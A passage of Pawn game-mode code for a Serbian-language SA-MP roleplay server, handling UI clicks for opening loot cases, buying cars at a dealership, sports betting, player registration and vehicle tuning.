                ShowPlayerDialog(playerid, dialog_HackingSifra, DIALOG_STYLE_INPUT, "Unos Sifre", "Unesite sifru koju ste dobili", "Unesi", "Odustani");
            }

            return 1;
        }

        if(playertextid == OpenCaseTD[playerid][13]) {

            OpenCaseTDControl(playerid, false);

            return 1;
        }
        //6 9 12

        if(playertextid == OpenCaseTD[playerid][6]) {

            if(IsValidDynamicObject(PlayerCaseOBJ[209][playerid])&&PlayerCaseX[playerid] != 0) return SendErrorMessage(playerid, "Vec otvaras case!");

            foreach(Player, i) {

                if(IsValidDynamicObject(PlayerCaseOBJ[209][i])&&PlayerCaseX[i] != 0) return SendErrorMessage(playerid, "Neko vec otvara case! Pricekaj malo!");
            }

            if(PlayerInfo[playerid][xKey] < 1) return SendErrorMessage(playerid, "Nemas dovoljno kljuceva (1 key)");

            OpenCaseTDControl(playerid, false);

            PlayerInfo[playerid][xKey]--;
            SavePlayer(playerid);

            TogglePlayerControllable(playerid,0);
            OpenCrate(playerid);

            SendInfoMessage(playerid, "Ucitavanje nagrada iz case-a....");

            if(PlayerInfo[playerid][xAchivements][14] == 0) {

                achivementPassed(playerid, 14, 6000);
            }

            return 1;
        }

        if(playertextid == OpenCaseTD[playerid][9]) {

            //Lion
            SendInfoMessage(playerid, "Trenutno nemamo ovaj case!");

            return 1;
        }

        if(playertextid == OpenCaseTD[playerid][12]) {

            //Clown
            SendInfoMessage(playerid, "Trenutno nemamo ovaj case!");

            return 1;
        }

 	    if( playertextid == BuyCar[ playerid ][ 1 ] ) {
 	        // new as = GetNearestSalon( playerid ), slotid = AutoSalon[ as ][ aIzlogVeh ];
            new as = GetNearestSalon(playerid);
			if( as != -1 ) {
	  		    if( ModelCar[ playerid ] == (AutoSalon[ as ][ aMaxVehModel ]-1) ) return 1;
	  		    
				ModelCar[ playerid ]++;

				new string[ 128 ];
				format( string, sizeof( string ), "%s", ImeVozila[ AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ]-400 ] );
				PlayerTextDrawSetString( playerid, BuyCar[ playerid ][ 2 ], string );
				format( string, sizeof( string ), "Cena: ~w~%d$", VehPrice[ AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ]-400 ][ 1 ] );
				PlayerTextDrawSetString( playerid, BuyCar[ playerid ][ 3 ], string );

				SetPlayerCameraPos( playerid, AutoSalon[ as ][ aCameraPos ][ 0 ], AutoSalon[ as ][ aCameraPos ][ 1 ], AutoSalon[ as ][ aCameraPos ][ 2 ] );
				SetPlayerCameraLookAt( playerid, AutoSalon[ as ][ aCameraLookAt ][ 0 ], AutoSalon[ as ][ aCameraLookAt ][ 1 ], AutoSalon[ as ][ aCameraLookAt ][ 2 ] );

				// Novi_DestroyVehicle( VehicleInfo[ slotid ][ vID ] );
				// VehicleInfo[ slotid ][ vID ] = Novi_CreateVehicle( slotid, VehicleInfo[ slotid ][ vUsage ], VehicleInfo[ slotid ][ vOrganization ], VehicleInfo[ slotid ][ vJob ], AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ], VehicleInfo[ slotid ][ vLokacijaX ], VehicleInfo[ slotid ][ vLokacijaY ], VehicleInfo[ slotid ][ vLokacijaZ ]+1.0, VehicleInfo[ slotid ][ vLokacijaA ], -1, -1, -1 );
			 //    SetVehicleVirtualWorld( VehicleInfo[ slotid ][ vID ], AutoSalon[ as ][ aVW ] );
			 //    LinkVehicleToInterior( VehicleInfo[ slotid ][ vID ], AutoSalon[ as ][ aInt ] );

			    SelectTextDraw( playerid, SRVBOJA1 );
			}
			return true;
		}
 	    if( playertextid == BuyCar[ playerid ][ 4 ] ) {
 	        new as = GetNearestSalon( playerid ); //slotid = AutoSalon[ as ][ aIzlogVeh ];
			if( as != -1 ) {
	  		    if( ModelCar[ playerid ] == 0 ) return 1;
				ModelCar[ playerid ]--;

				new string[ 128 ];
				format( string, sizeof( string ), "%s", ImeVozila[ AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ]-400 ] );
				PlayerTextDrawSetString( playerid, BuyCar[ playerid ][ 2 ], string );
				format( string, sizeof( string ), "Cena: ~w~%d$", VehPrice[ AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ]-400 ][ 1 ] );
				PlayerTextDrawSetString( playerid, BuyCar[ playerid ][ 3 ], string );

				SetPlayerCameraPos( playerid, AutoSalon[ as ][ aCameraPos ][ 0 ], AutoSalon[ as ][ aCameraPos ][ 1 ], AutoSalon[ as ][ aCameraPos ][ 2 ] );
				SetPlayerCameraLookAt( playerid, AutoSalon[ as ][ aCameraLookAt ][ 0 ], AutoSalon[ as ][ aCameraLookAt ][ 1 ], AutoSalon[ as ][ aCameraLookAt ][ 2 ] );

				// Novi_DestroyVehicle( VehicleInfo[ slotid ][ vID ] );
				// VehicleInfo[ slotid ][ vID ] = Novi_CreateVehicle( slotid, VehicleInfo[ slotid ][ vUsage ], VehicleInfo[ slotid ][ vOrganization ], VehicleInfo[ slotid ][ vJob ], AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ], VehicleInfo[ slotid ][ vLokacijaX ], VehicleInfo[ slotid ][ vLokacijaY ], VehicleInfo[ slotid ][ vLokacijaZ ]+1.0, VehicleInfo[ slotid ][ vLokacijaA ], -1, -1, -1 );
			 //    SetVehicleVirtualWorld( VehicleInfo[ slotid ][ vID ], AutoSalon[ as ][ aVW ] );
			 //    LinkVehicleToInterior( VehicleInfo[ slotid ][ vID ], AutoSalon[ as ][ aInt ] );

			    SelectTextDraw( playerid, SRVBOJA1 );
			}
			return true;
		}
		if( playertextid == BuyCar[ playerid ][ 8 ] ) {
			new as = GetNearestSalon( playerid ); //slotid = AutoSalon[ as ][ aIzlogVeh ];
			if( as != -1 ) {
				AutoSalon[ as ][ AlreadyBuying ] = false;

	    		PlayerBuyingAS[ playerid ] = -1;
				ModelCar[ playerid ] = 0;

			 //    Novi_DestroyVehicle( VehicleInfo[ slotid ][ vID ] );
				// VehicleInfo[ slotid ][ vID ] = Novi_CreateVehicle( slotid, VehicleInfo[ slotid ][ vUsage ], VehicleInfo[ slotid ][ vOrganization ], VehicleInfo[ slotid ][ vJob ], AutoSalon[ as ][ aVehModel ][ 0 ], VehicleInfo[ slotid ][ vLokacijaX ], VehicleInfo[ slotid ][ vLokacijaY ], VehicleInfo[ slotid ][ vLokacijaZ ]+1.0, VehicleInfo[ slotid ][ vLokacijaA ], -1, -1, -1 );
			 //    SetVehicleVirtualWorld( VehicleInfo[ slotid ][ vID ], AutoSalon[ as ][ aVW ] );
			 //    LinkVehicleToInterior( VehicleInfo[ slotid ][ vID ], AutoSalon[ as ][ aInt ] );

				BuyCarTDControl( playerid, false );
				TogglePlayerControllable( playerid, true );

				SetCameraBehindPlayer( playerid );
				CancelSelectTextDraw( playerid );
			}
			return true;
		}
		if( playertextid == BuyCar[ playerid ][ 7 ] )  {
		    new as = GetNearestSalon( playerid ), slotid = AutoSalon[ as ][ aIzlogVeh ];
			if( as != -1 ) {
			    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SCM( playerid, SVETLOCRVENA, "| V:AC | Nemoguce je trenutno kupiti vozilo, limit vozila na serveru je dosegnut.");
			    if( PlayerInfo[ playerid ][ xNovac ] < VehPrice[ AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ]- 400 ][ 1 ] ) return SendErrorMessage( playerid, "Nemas dovoljno novca." );

                if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 ) { }
                else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1 ) { }
                else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1 ) { }
                else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1 ) {
					if( PlayerInfo[ playerid ][ xDonatorSlot ] == true ) { }
					else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );
				}
				else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );

			    if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Morate biti level 3+ da bi ste kupili vozilo." );
				
				//if( AutoSalon[ as ][ aVehAmmount ][ ModelCar[ playerid ] ] == 0 ) return SendErrorMessage( playerid, "Nemamo vise ovih modela u prodaji." );
				
				for( new i = 1; i < MAX_CARS; i++ ) {
				    new fileauta[ 40 ];
					format(fileauta, sizeof( fileauta ), V_FILE, i);
					if( !fexist( fileauta ) ) {
						VehicleInfo[ i ][ vOwned ] = 1;
						VehicleInfo[ i ][ vNeaktivnost ] = 0;
						VehicleInfo[ i ][ vPrice ] = VehPrice[ AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ]- 400 ][ 1 ];
						strmid( VehicleInfo[ i ][ vOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 32);
						VehicleInfo[ i ][ vLocked ] = 0;

                        new pozicijaV = random(sizeof(RandomAutoSalon));

						VehicleInfo[ i ][ vLokacijaX ] = RandomAutoSalon[pozicijaV][0];
						VehicleInfo[ i ][ vLokacijaY ] = RandomAutoSalon[pozicijaV][1];
						VehicleInfo[ i ][ vLokacijaZ ] = RandomAutoSalon[pozicijaV][2];
						VehicleInfo[ i ][ vLokacijaA ] = RandomAutoSalon[pozicijaV][3];
						VehicleInfo[ i ][ vVirtualWorld ] = 0;
						VehicleInfo[ i ][ vInterior ] = 0;
						VehicleInfo[ i ][ vUsage ] = PRIVATNO_VOZILO;
						VehicleInfo[ i ][ vJob ] = 0;
						VehicleInfo[ i ][ vOrganization ] = 0;
						VehicleInfo[ i ][ vColor1 ] = 0;
						VehicleInfo[ i ][ vColor2 ] = 0;
						VehicleInfo[ i ][ vModel ] = AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ];
						VehicleInfo[ i ][ vReg ] = 0;
						VehicleInfo[ i ][ vTeh ] = 0;
						VehicleInfo[ i ][ vGPS ] = 0;
						VehicleInfo[ i ][ vOsiguranje ] = 5;
						VehicleInfo[ i ][ vLock ] = 0;
						VehicleInfo[ i ][ vAlarm ] = 0;
						VehicleInfo[ i ][ vTuned ] = 0;
						VehicleInfo[ i ][ vNeon ] = 0;
						VehicleInfo[ i ][ vImobilizator ] = 0;
						VehicleInfo[ i ][ vSpoiler ] = 0;
						VehicleInfo[ i ][ vHood ] = 0;
						VehicleInfo[ i ][ vRoof ] = 0;
						VehicleInfo[ i ][ vSkirt ] = 0;
						VehicleInfo[ i ][ vLamps ] = 0;
						VehicleInfo[ i ][ vNitro ] = 0;
						VehicleInfo[ i ][ vExhaust ] = 0;
						VehicleInfo[ i ][ vWheels ] = 0;
						VehicleInfo[ i ][ vStereo ] = 0;
						VehicleInfo[ i ][ vHydraulics ] = 0;
						VehicleInfo[ i ][ vFrontBumper ] = 0;
						VehicleInfo[ i ][ vRearBumper ] = 0;
						VehicleInfo[ i ][ vVents ] = 0;
						VehicleInfo[ i ][ vPaintJob ] = 255;
						VehicleInfo[ i ][ vProvera ] = i;
						VehicleInfo[ i ][ vDrug ][ 0 ] = 0; VehicleInfo[ i ][ vDrug ][ 1 ] = 0; VehicleInfo[ i ][ vDrug ][ 2 ] = 0; VehicleInfo[ i ][ vDrug ][ 3 ] = 0; VehicleInfo[ i ][ vDrug ][ 4 ] = 0; VehicleInfo[ i ][ vDrug ][ 5 ] = 0;
						VehicleInfo[ i ][ vDrugCode ][ 0 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 1 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 2 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 3 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 4 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 5 ] = 0;
		                VehicleInfo[ i ][ vMelee ] = 0; VehicleInfo[ i ][ vWeap1 ] = 0; VehicleInfo[ i ][ vAmmo1 ] = 0; VehicleInfo[ i ][ vWeap2 ] = 0; VehicleInfo[ i ][ vAmmo2 ] = 0;
		                VehicleInfo[ i ][ vGajbica ][ 0 ] = -1; VehicleInfo[ i ][ vGajbica ][ 1 ] = -1; VehicleInfo[ i ][ vGajbica ][ 2 ] = -1; VehicleInfo[ i ][ vGajbica ][ 3 ] = -1; VehicleInfo[ i ][ vGajbica ][ 4 ] = -1;
						VehicleInfo[ i ][ vGajbicaAmmount ][ 0 ] = 0; VehicleInfo[ i ][ vGajbicaAmmount ][ 1 ] = 0; VehicleInfo[ i ][ vGajbicaAmmount ][ 2 ] = 0; VehicleInfo[ i ][ vGajbicaAmmount ][ 3 ] = 0; VehicleInfo[ i ][ vGajbicaAmmount ][ 4 ] = 0;
                        Novi_DestroyVehicle(VehicleInfo[i][vID]);
						VehicleInfo[ i ][ vID ] = V01D_CreateVehicle(VehicleInfo[ i ][ vModel ], VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ]+1.0, VehicleInfo[ i ][ vLokacijaA ], VehicleInfo[ i ][ vColor1 ], VehicleInfo[ i ][ vColor2 ], 300000 );
                        LinkVehicleToInterior( VehicleInfo[ i ][ vID ], VehicleInfo[ i ][ vInterior ] );
                		SetVehicleVirtualWorld( VehicleInfo[ i ][ vID ], VehicleInfo[ i ][ vVirtualWorld ] );
						VehicleInfo[ i ][ vFuel ] = getAmountFuel( VehicleInfo[ i ][ vID ] ); vCanDrive[ VehicleInfo[ i ][ vID ] ] = 1; Fuel[ VehicleInfo[ i ][ vID ] ] = getAmountFuel( VehicleInfo[ i ][ vID ] ); 
						SetVehicleNumberPlate( VehicleInfo[ i ][ vID ], "NEMA" ); UnLockCar( VehicleInfo[ i ][ vID ] );
			            SaveVehicle( i );
		                carspawntimer = 1; ResetVehicleStatistics( VehicleInfo[ i ][ vID ] );
		     			SetTimer("AntiSpawnCrash", 3000, 0);
		     			
		     			
		     			SetVehicleParamsEx( VehicleInfo[ i ][ vID ], 0, 0, 0, VehicleInfo[ i ][ vLocked ], 0, 0, 0 );
		                if( IsVehicleBajs( VehicleInfo[ i ][ vID ] ) ) {
							SetVehicleParamsEx( VehicleInfo[ i ][ vID ], 1, 0, 0, VehicleInfo[ i ][ vLocked ], 0, 0, 0 );
						}

		     			DajIgracuNovac( playerid, -VehPrice[ AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ]- 400 ][ 1 ] );

		     			if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 ){ PlayerInfo[ playerid ][ xVoziloID ][ 0 ] = i; }
						else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1 ) { PlayerInfo[ playerid ][ xVoziloID ][ 1 ] = i; }
						else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1 ) { PlayerInfo[ playerid ][ xVoziloID ][ 2 ] = i; }
						else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1 ) { PlayerInfo[ playerid ][ xVoziloID ][ 3 ] = i; }
		                SavePlayer( playerid );

		     			new string[ 128 ]; 
						format( string, sizeof( string ), "Igrac %s je kupio vozilo %s u salonu ID %d", ImeIgraca( playerid ), ImeVozila[ AutoSalon[ as ][ aVehModel ][ ModelCar[ playerid ] ]-400 ], as );
						LogSave( "Ostalo/LogKupiVozilo.log", string );

                        //AutoSalon[ as ][ aVehAmmount ][ ModelCar[ playerid ] ]--;
		     			AutoSalon[ as ][ AlreadyBuying ] = false;
		     			SaveSalon( as );

			    		PlayerBuyingAS[ playerid ] = -1;
						ModelCar[ playerid ] = 0;

					    Novi_DestroyVehicle( VehicleInfo[ slotid ][ vID ] );
						VehicleInfo[ slotid ][ vID ] = V01D_CreateVehicle(AutoSalon[ as ][ aVehModel ][ 0 ], VehicleInfo[ slotid ][ vLokacijaX ], VehicleInfo[ slotid ][ vLokacijaY ], VehicleInfo[ slotid ][ vLokacijaZ ]+1.0, VehicleInfo[ slotid ][ vLokacijaA ], -1, -1, -1 );
					    SetVehicleVirtualWorld( VehicleInfo[ slotid ][ vID ], AutoSalon[ as ][ aVW ] );
					    LinkVehicleToInterior( VehicleInfo[ slotid ][ vID ], AutoSalon[ as ][ aInt ] );

						BuyCarTDControl( playerid, false );
						TogglePlayerControllable( playerid, true );

						SetCameraBehindPlayer( playerid );
						CancelSelectTextDraw( playerid );
		     			SendInfoMessage( playerid, "Uspesno ste kupili vozilo, oznaceno vam je na raderu markerom." );

                        if(PlayerInfo[playerid][xAchivements][10] == 0) {

                            achivementPassed(playerid, 10, 5000);
                        }
		     			
		     			Novi_SetPlayerCheckpoint( playerid, VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ], 5.0 );
						CheckpointStatus[ playerid ] = 15;
						break;
					}
				}
			}
			return true;
		}
		if( playertextid == KladionicaSM[ playerid ][ 31 ] ) {
		
		    new str[ 128 ];
		
		    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			strcat( DialogStrgEx, str );
		
		    for(  new i = 0; i < 10; i++ ) {
		    
			    format( str, sizeof( str ), "%s vs %s\n", bettingInfo[ Parovi[ i ][ parID ][ 0 ] ][ teamName ], bettingInfo[ Parovi[ i ][ parID ][ 1 ] ][ teamName ] );

                strcat( DialogStrgEx, str );
			}
		
	    	SPD( playerid, dialog_UPLATITIKET, DSL, "Izaberi par:", DialogStrgEx, "Izaberi", "Odustani" );
	    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
            return true;
	    }
 	    if( playertextid == RegisterTD[ playerid ][ 16 ] ) {
	    	SPD( playerid, dialog_REGISTER, DIALOG_STYLE_PASSWORD, "Registracija", "Password moze sadrzavati minimalno 6 a maximalno 24 znaka", "Registriraj", "Izadji" );
            return true;
	    }
		if (playertextid == RegisterTD[ playerid ][ 20 ]) {
			SPD( playerid, dialog_Sex, DIALOG_STYLE_MSGBOX, "Pol", "Odaberi pol", "Musko", "Zensko");
			return true;
		}
		// if( playertextid == RegisterTD[ playerid ][ 8 ] ) { // >>
		// 	if(!OdabraoSex[playerid]) return SendErrorMessage(playerid, "Prvo odaberi pol!");
		// 	if(PlayerInfo[playerid][xPol] == 1) //Musko
		// 	{
		// 		if(BiraSkin[playerid] == 1) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], MuskiSkinoviID[1][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 2;
		// 			OdabraniSkin[playerid] = MuskiSkinoviID[1][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 2) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], MuskiSkinoviID[2][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 3;
		// 			OdabraniSkin[playerid] = MuskiSkinoviID[2][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 3) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], MuskiSkinoviID[3][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 4;
		// 			OdabraniSkin[playerid] = MuskiSkinoviID[3][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 4) return SendErrorMessage(playerid, "Nema dalje!");
		// 	} 
		// 	if(PlayerInfo[playerid][xPol] == 2) {

		// 		if(BiraSkin[playerid] == 1) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], ZenskiSkinoviID[1][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 2;
		// 			OdabraniSkin[playerid] = ZenskiSkinoviID[1][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 2) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], ZenskiSkinoviID[2][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 3;
		// 			OdabraniSkin[playerid] = ZenskiSkinoviID[2][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 3) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], ZenskiSkinoviID[3][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 4;
		// 			OdabraniSkin[playerid] = ZenskiSkinoviID[3][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 4) return SendErrorMessage(playerid, "Nema dalje!");
		// 	}
		// }
		// if( playertextid == RegisterTD[ playerid ][ 9 ] ) { // <<
		// 	if(!OdabraoSex[playerid] ) return SendErrorMessage(playerid, "Prvo odaberi pol!");
		// 	if(PlayerInfo[playerid][xPol] == 1) //Musko
		// 	{
		// 		if(BiraSkin[playerid] == 1) return SendErrorMessage(playerid, "Nema dalje!");
		// 		if(BiraSkin[playerid] == 2) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], MuskiSkinoviID[0][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 1;
		// 			OdabraniSkin[playerid] = MuskiSkinoviID[0][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 3) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], MuskiSkinoviID[1][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 2;
		// 			OdabraniSkin[playerid] = MuskiSkinoviID[1][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 4) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], MuskiSkinoviID[2][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 3;
		// 			OdabraniSkin[playerid] = MuskiSkinoviID[2][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 5) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], MuskiSkinoviID[3][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 4;
		// 			OdabraniSkin[playerid] = MuskiSkinoviID[3][0];
		// 			return 1;
		// 		}
		// 	}
		// 	if(PlayerInfo[playerid][xPol] == 2) //Zensko
		// 	{
		// 		if(BiraSkin[playerid] == 1) return SendErrorMessage(playerid, "Nema dalje!");
		// 		if(BiraSkin[playerid] == 2) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], ZenskiSkinoviID[0][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 1;
		// 			OdabraniSkin[playerid] = ZenskiSkinoviID[0][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 3) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], ZenskiSkinoviID[1][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 2;
		// 			OdabraniSkin[playerid] = ZenskiSkinoviID[1][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 4) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], ZenskiSkinoviID[2][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 3;
		// 			OdabraniSkin[playerid] = ZenskiSkinoviID[2][0];
		// 			return 1;
		// 		}
		// 		if(BiraSkin[playerid] == 5) {

		// 			PlayerTextDrawSetPreviewModel(playerid, RegisterTD[playerid][7], ZenskiSkinoviID[3][0]);
		// 			PlayerTextDrawShow(playerid, RegisterTD[playerid][7]);
		// 			BiraSkin[playerid] = 4;
		// 			OdabraniSkin[playerid] = ZenskiSkinoviID[3][0];
		// 			return 1;
		// 		}
		// 	}
		// }
 	    if( playertextid == RegisterTD[ playerid ][ 21 ] ) {
	    	SPD( playerid, dialog_COUNTRY, DSL, "Poreklo", "Srbija\nHrvatska\nMakedonija\nCrna Gora\nBosna i Hercegovina\nOstalo", "Odabir", "Izadji" );
            return true;
		}
	    if( playertextid == RegisterTD[ playerid ][ 19 ] ) {
	        SPD( playerid, dialog_AGE, DSI, "Godine", "U prazni prostor ispod unesite vase godine\nMinimalno 12 maximalno 70", "Unos", "Izadji" );
            return true;
		}
	    if( playertextid == RegisterTD[ playerid ][ 18 ] ) {
		   	SPD(playerid, dialog_MAIL, DSI, "Mail", "U prazni prostor ispod unesite vasu e-mail adresu.\nE-mail adresa ce nam posluziti u vracanju vasih passworda.(Bez maila nema vracanja passworda)", "Unos", "Izadji" );
            return true;
		}
        if(playertextid == RegisterTD[playerid][27]) {

            if(!OdabraoSex[playerid] ) return SendErrorMessage(playerid, "Prvo odaberi pol!");
            
            new string[32], bigStr[512];
            if(PlayerInfo[playerid][xPol] == 1) { //musko

                for(new i = 0; i < sizeof(MuskiSkinoviImena); i++) {

                    format(string, sizeof(string), "%s\n", MuskiSkinoviImena[i]);
                    strcat(bigStr, string);
                }
                SPD(playerid, dialog_SKIN, DSL, "Odaberite Skin", string, "Odabir", "Izadji");

                return true;
            }
            else {

                for(new i = 0; i < sizeof(ZenskiSkinoviImena); i++) {

                    format(string, sizeof(string), "%s\n", ZenskiSkinoviImena[i][0]);
                    strcat(bigStr, string);
                }
                SPD(playerid, dialog_SKIN, DSL, "Odaberite Skin", string, "Odabir", "Izadji");

                return true;
            }
        }
	    if( playertextid == RegisterTD[ playerid ][ 29 ] ) {
            if( InputPassword[ playerid ] == false ) return SendErrorMessage( playerid, "Nisi odabrao lozinku." );
			if( ChoseCountry[ playerid ] == false ) return SendErrorMessage( playerid, "Nisi odabrao poreklo." );
			if( InputAge[ playerid ] == false ) return SendErrorMessage( playerid, "Nisi odabrao godine starosti." );
			if( InputMail[ playerid ] == false ) return SendErrorMessage( playerid, "Nisi uneo email." );
			if( !OdabraoSex[playerid] ) return SendErrorMessage( playerid, "Nisi odabrao pol." );
            if(!OdabraoSkin[playerid]) return SendErrorMessage(playerid, "Nisi odabrao skin.");
			CancelSelectTextDraw( playerid );
			IgracSeRegistruje[ playerid ] = false;
			RegisterTDControl( playerid, false );
			PlayerInfo[ playerid ][ xRegistrovan ] = 1;
			PlayerInfo[ playerid ][ xPocetniTut ] = 0;
			PlayerInfo[ playerid ][ xSpawn ] = SetRandomSpawn(  );
			PlayerInfo[ playerid ][ xLevel ] = ServerInfo[ PocetniLevel ];
            PlayerInfo[playerid][xSkin] = OdabraniSkin[playerid];
			new datum[ 64 ]; new year, month,day;
			getdate( year, month, day );
			new tmphour, tmpminute, tmpsecond;
			gettimeEx( tmphour, tmpminute, tmpsecond );
			FixHour( tmphour );
			tmphour = shifthour;
   			format( datum, sizeof( datum ), "%02d/%02d/%d - %d/%d/%d", day, month, year, tmphour, tmpminute, tmpsecond );
		    strmid( PlayerInfo[ playerid ][ xLastLogin ], datum, 0, strlen( datum ), 64 );
			SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
			DajIgracuNovac( playerid, ServerInfo[ PocetniNovaca ] );
			SavePlayer( playerid );

			PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
			SCM(playerid, -1, "Uspesno ste se registrirali na "SRVBOJA1SCM"Valhalla"col_white" te vam zelimo dobrodoslicu!");

            aliasLogin( playerid );
	        PlayerInfo[ playerid ][ xPocetniTut ] = 1;
	        TogglePlayerSpectating( playerid, false ); PlayerLogged[ playerid ] = true;
	        antiCheatCS[ playerid ][ TeleportCheck ] = 4;
	        antiCheatCS[ playerid ][ WeaponDetect ] = 4;
	        SetCameraBehindPlayer( playerid ); TogglePlayerControllable( playerid, true );
			SetPlayerInterior( playerid, 0 ); SetPlayerVirtualWorld( playerid, 0 );
			Novi_SetSpawnInfo( playerid );
            SetPlayerInterior( playerid, 0 ); 
            SetPlayerVirtualWorld( playerid, 0 );
            TogglePlayerSpectating( playerid, false );
			SpawnPlayer( playerid ); SavePlayer( playerid );
            
		    PocetniTutorialStartovan[ playerid ] = false;
	    
		    ServerInfo[ RegistrovanihKorisnika ]++;
		
		    SPD( playerid, 0, DSMSG, D_NASLOV, DialogTekstovi[ 1 ], "U redu", "" );

            for(new i=0; i<30; i++)
            {
                TextDrawShowForPlayer(playerid, InGame_TD[i]);
            }

            happyHoursTDControl(ServerInfo[HappyHours]);

            happyJobTDControl(ServerInfo[HappyJob]);

			ResetAllWeapons( playerid );
			
			new playersip[ 128 ];
	       	GetPlayerIp( playerid, playersip, sizeof( playersip ) );
	        			
			format( globalstring, sizeof( globalstring ), "Igrac: %s | [ID:%d] | [IP:%s] se registrovao na server.", ImeIgraca( playerid ), playerid, playersip );
			//AdminPoruka( ZUTA, globalstring );
            RPTChat( ZUTA, globalstring);
		}

		if( playertextid == TuningBuy[ playerid ][ 7 ] ) { // desno
            if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
	        if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );

            if( TPInfo[ playerid ][ tPaintjob ] == false ) {

				new compid = -1, vehicleid = GetPlayerVehicleID( playerid );

	            for( new i = ( TPInfo[ playerid ][ tID ]+1 ); i < MAX_COMPONENTS; i++ ) {
					if( cInfo[ i ][ cType ] == TPInfo[ playerid ][ tType ] ) {
						if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
							compid = i;
							break;
